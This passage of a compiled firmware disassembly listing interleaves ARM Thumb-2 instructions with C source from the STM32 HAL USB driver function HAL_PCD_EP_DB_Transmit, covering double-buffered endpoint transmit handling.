 80030c8:	88fb      	ldrh	r3, [r7, #6]
 80030ca:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80030ce:	2b00      	cmp	r3, #0
 80030d0:	f000 81db 	beq.w	800348a <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 80030d4:	68fb      	ldr	r3, [r7, #12]
 80030d6:	681b      	ldr	r3, [r3, #0]
 80030d8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80030dc:	b29b      	uxth	r3, r3
 80030de:	461a      	mov	r2, r3
 80030e0:	68bb      	ldr	r3, [r7, #8]
 80030e2:	781b      	ldrb	r3, [r3, #0]
 80030e4:	00db      	lsls	r3, r3, #3
 80030e6:	4413      	add	r3, r2
 80030e8:	68fa      	ldr	r2, [r7, #12]
 80030ea:	6812      	ldr	r2, [r2, #0]
 80030ec:	4413      	add	r3, r2
 80030ee:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80030f2:	881b      	ldrh	r3, [r3, #0]
 80030f4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80030f8:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 80030fc:	68bb      	ldr	r3, [r7, #8]
 80030fe:	699a      	ldr	r2, [r3, #24]
 8003100:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003104:	429a      	cmp	r2, r3
 8003106:	d907      	bls.n	8003118 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8003108:	68bb      	ldr	r3, [r7, #8]
 800310a:	699a      	ldr	r2, [r3, #24]
 800310c:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003110:	1ad2      	subs	r2, r2, r3
 8003112:	68bb      	ldr	r3, [r7, #8]
 8003114:	619a      	str	r2, [r3, #24]
 8003116:	e002      	b.n	800311e <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8003118:	68bb      	ldr	r3, [r7, #8]
 800311a:	2200      	movs	r2, #0
 800311c:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 800311e:	68bb      	ldr	r3, [r7, #8]
 8003120:	699b      	ldr	r3, [r3, #24]
 8003122:	2b00      	cmp	r3, #0
 8003124:	f040 80b9 	bne.w	800329a <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003128:	68bb      	ldr	r3, [r7, #8]
 800312a:	785b      	ldrb	r3, [r3, #1]
 800312c:	2b00      	cmp	r3, #0
 800312e:	d126      	bne.n	800317e <HAL_PCD_EP_DB_Transmit+0xc4>
 8003130:	68fb      	ldr	r3, [r7, #12]
 8003132:	681b      	ldr	r3, [r3, #0]
 8003134:	62fb      	str	r3, [r7, #44]	; 0x2c
 8003136:	68fb      	ldr	r3, [r7, #12]
 8003138:	681b      	ldr	r3, [r3, #0]
 800313a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800313e:	b29b      	uxth	r3, r3
 8003140:	461a      	mov	r2, r3
 8003142:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8003144:	4413      	add	r3, r2
 8003146:	62fb      	str	r3, [r7, #44]	; 0x2c
 8003148:	68bb      	ldr	r3, [r7, #8]
 800314a:	781b      	ldrb	r3, [r3, #0]
 800314c:	00da      	lsls	r2, r3, #3
 800314e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8003150:	4413      	add	r3, r2
 8003152:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003156:	62bb      	str	r3, [r7, #40]	; 0x28
 8003158:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800315a:	881b      	ldrh	r3, [r3, #0]
 800315c:	b29b      	uxth	r3, r3
 800315e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003162:	b29a      	uxth	r2, r3
 8003164:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003166:	801a      	strh	r2, [r3, #0]
 8003168:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800316a:	881b      	ldrh	r3, [r3, #0]
 800316c:	b29b      	uxth	r3, r3
 800316e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003172:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003176:	b29a      	uxth	r2, r3
 8003178:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800317a:	801a      	strh	r2, [r3, #0]
 800317c:	e01a      	b.n	80031b4 <HAL_PCD_EP_DB_Transmit+0xfa>
 800317e:	68bb      	ldr	r3, [r7, #8]
 8003180:	785b      	ldrb	r3, [r3, #1]
 8003182:	2b01      	cmp	r3, #1
 8003184:	d116      	bne.n	80031b4 <HAL_PCD_EP_DB_Transmit+0xfa>
 8003186:	68fb      	ldr	r3, [r7, #12]
 8003188:	681b      	ldr	r3, [r3, #0]
 800318a:	637b      	str	r3, [r7, #52]	; 0x34
 800318c:	68fb      	ldr	r3, [r7, #12]
 800318e:	681b      	ldr	r3, [r3, #0]
 8003190:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003194:	b29b      	uxth	r3, r3
 8003196:	461a      	mov	r2, r3
 8003198:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800319a:	4413      	add	r3, r2
 800319c:	637b      	str	r3, [r7, #52]	; 0x34
 800319e:	68bb      	ldr	r3, [r7, #8]
 80031a0:	781b      	ldrb	r3, [r3, #0]
 80031a2:	00da      	lsls	r2, r3, #3
 80031a4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80031a6:	4413      	add	r3, r2
 80031a8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80031ac:	633b      	str	r3, [r7, #48]	; 0x30
 80031ae:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80031b0:	2200      	movs	r2, #0
 80031b2:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80031b4:	68fb      	ldr	r3, [r7, #12]
 80031b6:	681b      	ldr	r3, [r3, #0]
 80031b8:	627b      	str	r3, [r7, #36]	; 0x24
 80031ba:	68bb      	ldr	r3, [r7, #8]
 80031bc:	785b      	ldrb	r3, [r3, #1]
 80031be:	2b00      	cmp	r3, #0
 80031c0:	d126      	bne.n	8003210 <HAL_PCD_EP_DB_Transmit+0x156>
 80031c2:	68fb      	ldr	r3, [r7, #12]
 80031c4:	681b      	ldr	r3, [r3, #0]
 80031c6:	61fb      	str	r3, [r7, #28]
 80031c8:	68fb      	ldr	r3, [r7, #12]
 80031ca:	681b      	ldr	r3, [r3, #0]
 80031cc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031d0:	b29b      	uxth	r3, r3
 80031d2:	461a      	mov	r2, r3
 80031d4:	69fb      	ldr	r3, [r7, #28]
 80031d6:	4413      	add	r3, r2
 80031d8:	61fb      	str	r3, [r7, #28]
 80031da:	68bb      	ldr	r3, [r7, #8]
 80031dc:	781b      	ldrb	r3, [r3, #0]
 80031de:	00da      	lsls	r2, r3, #3
 80031e0:	69fb      	ldr	r3, [r7, #28]
 80031e2:	4413      	add	r3, r2
 80031e4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80031e8:	61bb      	str	r3, [r7, #24]
 80031ea:	69bb      	ldr	r3, [r7, #24]
 80031ec:	881b      	ldrh	r3, [r3, #0]
 80031ee:	b29b      	uxth	r3, r3
 80031f0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031f4:	b29a      	uxth	r2, r3
 80031f6:	69bb      	ldr	r3, [r7, #24]
 80031f8:	801a      	strh	r2, [r3, #0]
 80031fa:	69bb      	ldr	r3, [r7, #24]
 80031fc:	881b      	ldrh	r3, [r3, #0]
 80031fe:	b29b      	uxth	r3, r3
 8003200:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003204:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003208:	b29a      	uxth	r2, r3
 800320a:	69bb      	ldr	r3, [r7, #24]
 800320c:	801a      	strh	r2, [r3, #0]
 800320e:	e017      	b.n	8003240 <HAL_PCD_EP_DB_Transmit+0x186>
 8003210:	68bb      	ldr	r3, [r7, #8]
 8003212:	785b      	ldrb	r3, [r3, #1]
 8003214:	2b01      	cmp	r3, #1
 8003216:	d113      	bne.n	8003240 <HAL_PCD_EP_DB_Transmit+0x186>
 8003218:	68fb      	ldr	r3, [r7, #12]
 800321a:	681b      	ldr	r3, [r3, #0]
 800321c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003220:	b29b      	uxth	r3, r3
 8003222:	461a      	mov	r2, r3
 8003224:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8003226:	4413      	add	r3, r2
 8003228:	627b      	str	r3, [r7, #36]	; 0x24
 800322a:	68bb      	ldr	r3, [r7, #8]
 800322c:	781b      	ldrb	r3, [r3, #0]
 800322e:	00da      	lsls	r2, r3, #3
 8003230:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8003232:	4413      	add	r3, r2
 8003234:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003238:	623b      	str	r3, [r7, #32]
 800323a:	6a3b      	ldr	r3, [r7, #32]
 800323c:	2200      	movs	r2, #0
 800323e:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003240:	68bb      	ldr	r3, [r7, #8]
 8003242:	781b      	ldrb	r3, [r3, #0]
 8003244:	4619      	mov	r1, r3
 8003246:	68f8      	ldr	r0, [r7, #12]
 8003248:	f009 fc49 	bl	800cade <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 800324c:	88fb      	ldrh	r3, [r7, #6]
 800324e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003252:	2b00      	cmp	r3, #0
 8003254:	f000 82fa 	beq.w	800384c <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003258:	68fb      	ldr	r3, [r7, #12]
 800325a:	681b      	ldr	r3, [r3, #0]
 800325c:	461a      	mov	r2, r3
 800325e:	68bb      	ldr	r3, [r7, #8]
 8003260:	781b      	ldrb	r3, [r3, #0]
 8003262:	009b      	lsls	r3, r3, #2
 8003264:	4413      	add	r3, r2
 8003266:	881b      	ldrh	r3, [r3, #0]
 8003268:	b29b      	uxth	r3, r3
 800326a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800326e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003272:	82fb      	strh	r3, [r7, #22]
 8003274:	68fb      	ldr	r3, [r7, #12]
 8003276:	681b      	ldr	r3, [r3, #0]
 8003278:	461a      	mov	r2, r3
 800327a:	68bb      	ldr	r3, [r7, #8]
 800327c:	781b      	ldrb	r3, [r3, #0]
 800327e:	009b      	lsls	r3, r3, #2
 8003280:	441a      	add	r2, r3
 8003282:	8afb      	ldrh	r3, [r7, #22]
 8003284:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003288:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800328c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003290:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003294:	b29b      	uxth	r3, r3
 8003296:	8013      	strh	r3, [r2, #0]
 8003298:	e2d8      	b.n	800384c <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 800329a:	88fb      	ldrh	r3, [r7, #6]
 800329c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80032a0:	2b00      	cmp	r3, #0
 80032a2:	d021      	beq.n	80032e8 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80032a4:	68fb      	ldr	r3, [r7, #12]
 80032a6:	681b      	ldr	r3, [r3, #0]
 80032a8:	461a      	mov	r2, r3
 80032aa:	68bb      	ldr	r3, [r7, #8]
 80032ac:	781b      	ldrb	r3, [r3, #0]
 80032ae:	009b      	lsls	r3, r3, #2
 80032b0:	4413      	add	r3, r2
 80032b2:	881b      	ldrh	r3, [r3, #0]
 80032b4:	b29b      	uxth	r3, r3
 80032b6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80032ba:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80032be:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80032c2:	68fb      	ldr	r3, [r7, #12]
 80032c4:	681b      	ldr	r3, [r3, #0]
 80032c6:	461a      	mov	r2, r3
 80032c8:	68bb      	ldr	r3, [r7, #8]
 80032ca:	781b      	ldrb	r3, [r3, #0]
 80032cc:	009b      	lsls	r3, r3, #2
 80032ce:	441a      	add	r2, r3
 80032d0:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80032d4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80032d8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80032dc:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80032e0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80032e4:	b29b      	uxth	r3, r3
 80032e6:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80032e8:	68bb      	ldr	r3, [r7, #8]
 80032ea:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80032ee:	2b01      	cmp	r3, #1
 80032f0:	f040 82ac 	bne.w	800384c <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80032f4:	68bb      	ldr	r3, [r7, #8]
 80032f6:	695a      	ldr	r2, [r3, #20]
 80032f8:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032fc:	441a      	add	r2, r3
 80032fe:	68bb      	ldr	r3, [r7, #8]
 8003300:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 8003302:	68bb      	ldr	r3, [r7, #8]
 8003304:	69da      	ldr	r2, [r3, #28]
 8003306:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800330a:	441a      	add	r2, r3
 800330c:	68bb      	ldr	r3, [r7, #8]
 800330e:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003310:	68bb      	ldr	r3, [r7, #8]
 8003312:	6a1a      	ldr	r2, [r3, #32]
 8003314:	68bb      	ldr	r3, [r7, #8]
 8003316:	691b      	ldr	r3, [r3, #16]
 8003318:	429a      	cmp	r2, r3
 800331a:	d30b      	bcc.n	8003334 <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 800331c:	68bb      	ldr	r3, [r7, #8]
 800331e:	691b      	ldr	r3, [r3, #16]
 8003320:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003324:	68bb      	ldr	r3, [r7, #8]
 8003326:	6a1a      	ldr	r2, [r3, #32]
 8003328:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800332c:	1ad2      	subs	r2, r2, r3
 800332e:	68bb      	ldr	r3, [r7, #8]
 8003330:	621a      	str	r2, [r3, #32]
 8003332:	e017      	b.n	8003364 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 8003334:	68bb      	ldr	r3, [r7, #8]
 8003336:	6a1b      	ldr	r3, [r3, #32]
 8003338:	2b00      	cmp	r3, #0
 800333a:	d108      	bne.n	800334e <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 800333c:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003340:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003344:	68bb      	ldr	r3, [r7, #8]
 8003346:	2200      	movs	r2, #0
 8003348:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 800334c:	e00a      	b.n	8003364 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 800334e:	68bb      	ldr	r3, [r7, #8]
 8003350:	2200      	movs	r2, #0
 8003352:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 8003356:	68bb      	ldr	r3, [r7, #8]
 8003358:	6a1b      	ldr	r3, [r3, #32]
 800335a:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800335e:	68bb      	ldr	r3, [r7, #8]
 8003360:	2200      	movs	r2, #0
 8003362:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003364:	68bb      	ldr	r3, [r7, #8]
 8003366:	785b      	ldrb	r3, [r3, #1]
 8003368:	2b00      	cmp	r3, #0
 800336a:	d165      	bne.n	8003438 <HAL_PCD_EP_DB_Transmit+0x37e>
 800336c:	68fb      	ldr	r3, [r7, #12]
 800336e:	681b      	ldr	r3, [r3, #0]
 8003370:	63fb      	str	r3, [r7, #60]	; 0x3c
 8003372:	68fb      	ldr	r3, [r7, #12]
 8003374:	681b      	ldr	r3, [r3, #0]
 8003376:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800337a:	b29b      	uxth	r3, r3
 800337c:	461a      	mov	r2, r3
 800337e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003380:	4413      	add	r3, r2
 8003382:	63fb      	str	r3, [r7, #60]	; 0x3c
 8003384:	68bb      	ldr	r3, [r7, #8]
 8003386:	781b      	ldrb	r3, [r3, #0]
 8003388:	00da      	lsls	r2, r3, #3
 800338a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 800338c:	4413      	add	r3, r2
 800338e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003392:	63bb      	str	r3, [r7, #56]	; 0x38
 8003394:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003396:	881b      	ldrh	r3, [r3, #0]
 8003398:	b29b      	uxth	r3, r3
 800339a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800339e:	b29a      	uxth	r2, r3
 80033a0:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033a2:	801a      	strh	r2, [r3, #0]
 80033a4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033a8:	2b3e      	cmp	r3, #62	; 0x3e
 80033aa:	d91d      	bls.n	80033e8 <HAL_PCD_EP_DB_Transmit+0x32e>
 80033ac:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033b0:	095b      	lsrs	r3, r3, #5
 80033b2:	64bb      	str	r3, [r7, #72]	; 0x48
 80033b4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033b8:	f003 031f 	and.w	r3, r3, #31
 80033bc:	2b00      	cmp	r3, #0
 80033be:	d102      	bne.n	80033c6 <HAL_PCD_EP_DB_Transmit+0x30c>
 80033c0:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80033c2:	3b01      	subs	r3, #1
 80033c4:	64bb      	str	r3, [r7, #72]	; 0x48
 80033c6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033c8:	881b      	ldrh	r3, [r3, #0]
 80033ca:	b29a      	uxth	r2, r3
 80033cc:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80033ce:	b29b      	uxth	r3, r3
 80033d0:	029b      	lsls	r3, r3, #10
 80033d2:	b29b      	uxth	r3, r3
 80033d4:	4313      	orrs	r3, r2
 80033d6:	b29b      	uxth	r3, r3
 80033d8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033dc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033e0:	b29a      	uxth	r2, r3
 80033e2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033e4:	801a      	strh	r2, [r3, #0]
 80033e6:	e044      	b.n	8003472 <HAL_PCD_EP_DB_Transmit+0x3b8>
 80033e8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033ec:	2b00      	cmp	r3, #0
 80033ee:	d10a      	bne.n	8003406 <HAL_PCD_EP_DB_Transmit+0x34c>
 80033f0:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033f2:	881b      	ldrh	r3, [r3, #0]
 80033f4:	b29b      	uxth	r3, r3
 80033f6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033fa:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033fe:	b29a      	uxth	r2, r3
 8003400:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003402:	801a      	strh	r2, [r3, #0]
 8003404:	e035      	b.n	8003472 <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003406:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800340a:	085b      	lsrs	r3, r3, #1
 800340c:	64bb      	str	r3, [r7, #72]	; 0x48
 800340e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003412:	f003 0301 	and.w	r3, r3, #1
 8003416:	2b00      	cmp	r3, #0
 8003418:	d002      	beq.n	8003420 <HAL_PCD_EP_DB_Transmit+0x366>
 800341a:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800341c:	3301      	adds	r3, #1
 800341e:	64bb      	str	r3, [r7, #72]	; 0x48
 8003420:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003422:	881b      	ldrh	r3, [r3, #0]
 8003424:	b29a      	uxth	r2, r3
 8003426:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003428:	b29b      	uxth	r3, r3
 800342a:	029b      	lsls	r3, r3, #10
 800342c:	b29b      	uxth	r3, r3
 800342e:	4313      	orrs	r3, r2
 8003430:	b29a      	uxth	r2, r3
 8003432:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003434:	801a      	strh	r2, [r3, #0]
 8003436:	e01c      	b.n	8003472 <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003438:	68bb      	ldr	r3, [r7, #8]
 800343a:	785b      	ldrb	r3, [r3, #1]
 800343c:	2b01      	cmp	r3, #1
 800343e:	d118      	bne.n	8003472 <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003440:	68fb      	ldr	r3, [r7, #12]
 8003442:	681b      	ldr	r3, [r3, #0]
 8003444:	647b      	str	r3, [r7, #68]	; 0x44
 8003446:	68fb      	ldr	r3, [r7, #12]
 8003448:	681b      	ldr	r3, [r3, #0]
 800344a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800344e:	b29b      	uxth	r3, r3
 8003450:	461a      	mov	r2, r3
 8003452:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003454:	4413      	add	r3, r2
 8003456:	647b      	str	r3, [r7, #68]	; 0x44
 8003458:	68bb      	ldr	r3, [r7, #8]
 800345a:	781b      	ldrb	r3, [r3, #0]
 800345c:	00da      	lsls	r2, r3, #3
 800345e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003460:	4413      	add	r3, r2
 8003462:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003466:	643b      	str	r3, [r7, #64]	; 0x40
 8003468:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800346c:	b29a      	uxth	r2, r3
 800346e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8003470:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 8003472:	68fb      	ldr	r3, [r7, #12]
 8003474:	6818      	ldr	r0, [r3, #0]
 8003476:	68bb      	ldr	r3, [r7, #8]
 8003478:	6959      	ldr	r1, [r3, #20]
 800347a:	68bb      	ldr	r3, [r7, #8]
 800347c:	891a      	ldrh	r2, [r3, #8]
 800347e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003482:	b29b      	uxth	r3, r3
 8003484:	f005 f8c9 	bl	800861a <USB_WritePMA>
 8003488:	e1e0      	b.n	800384c <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 800348a:	68fb      	ldr	r3, [r7, #12]
 800348c:	681b      	ldr	r3, [r3, #0]
 800348e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003492:	b29b      	uxth	r3, r3
 8003494:	461a      	mov	r2, r3
 8003496:	68bb      	ldr	r3, [r7, #8]
 8003498:	781b      	ldrb	r3, [r3, #0]
 800349a:	00db      	lsls	r3, r3, #3
 800349c:	4413      	add	r3, r2
 800349e:	68fa      	ldr	r2, [r7, #12]
 80034a0:	6812      	ldr	r2, [r2, #0]
 80034a2:	4413      	add	r3, r2
 80034a4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80034a8:	881b      	ldrh	r3, [r3, #0]
 80034aa:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80034ae:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 80034b2:	68bb      	ldr	r3, [r7, #8]
 80034b4:	699a      	ldr	r2, [r3, #24]
 80034b6:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034ba:	429a      	cmp	r2, r3
 80034bc:	d307      	bcc.n	80034ce <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 80034be:	68bb      	ldr	r3, [r7, #8]
 80034c0:	699a      	ldr	r2, [r3, #24]
 80034c2:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034c6:	1ad2      	subs	r2, r2, r3
 80034c8:	68bb      	ldr	r3, [r7, #8]
 80034ca:	619a      	str	r2, [r3, #24]
 80034cc:	e002      	b.n	80034d4 <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 80034ce:	68bb      	ldr	r3, [r7, #8]
 80034d0:	2200      	movs	r2, #0
 80034d2:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80034d4:	68bb      	ldr	r3, [r7, #8]
 80034d6:	699b      	ldr	r3, [r3, #24]
 80034d8:	2b00      	cmp	r3, #0
 80034da:	f040 80c0 	bne.w	800365e <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80034de:	68bb      	ldr	r3, [r7, #8]
 80034e0:	785b      	ldrb	r3, [r3, #1]
 80034e2:	2b00      	cmp	r3, #0
 80034e4:	d126      	bne.n	8003534 <HAL_PCD_EP_DB_Transmit+0x47a>
 80034e6:	68fb      	ldr	r3, [r7, #12]
 80034e8:	681b      	ldr	r3, [r3, #0]
 80034ea:	67fb      	str	r3, [r7, #124]	; 0x7c
 80034ec:	68fb      	ldr	r3, [r7, #12]
 80034ee:	681b      	ldr	r3, [r3, #0]
 80034f0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80034f4:	b29b      	uxth	r3, r3
 80034f6:	461a      	mov	r2, r3
 80034f8:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80034fa:	4413      	add	r3, r2
 80034fc:	67fb      	str	r3, [r7, #124]	; 0x7c
 80034fe:	68bb      	ldr	r3, [r7, #8]
 8003500:	781b      	ldrb	r3, [r3, #0]
 8003502:	00da      	lsls	r2, r3, #3
 8003504:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003506:	4413      	add	r3, r2
 8003508:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800350c:	67bb      	str	r3, [r7, #120]	; 0x78
 800350e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003510:	881b      	ldrh	r3, [r3, #0]
 8003512:	b29b      	uxth	r3, r3
 8003514:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003518:	b29a      	uxth	r2, r3
 800351a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800351c:	801a      	strh	r2, [r3, #0]
 800351e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003520:	881b      	ldrh	r3, [r3, #0]
 8003522:	b29b      	uxth	r3, r3
 8003524:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003528:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800352c:	b29a      	uxth	r2, r3
 800352e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003530:	801a      	strh	r2, [r3, #0]
 8003532:	e01a      	b.n	800356a <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003534:	68bb      	ldr	r3, [r7, #8]
 8003536:	785b      	ldrb	r3, [r3, #1]
 8003538:	2b01      	cmp	r3, #1
 800353a:	d116      	bne.n	800356a <HAL_PCD_EP_DB_Transmit+0x4b0>
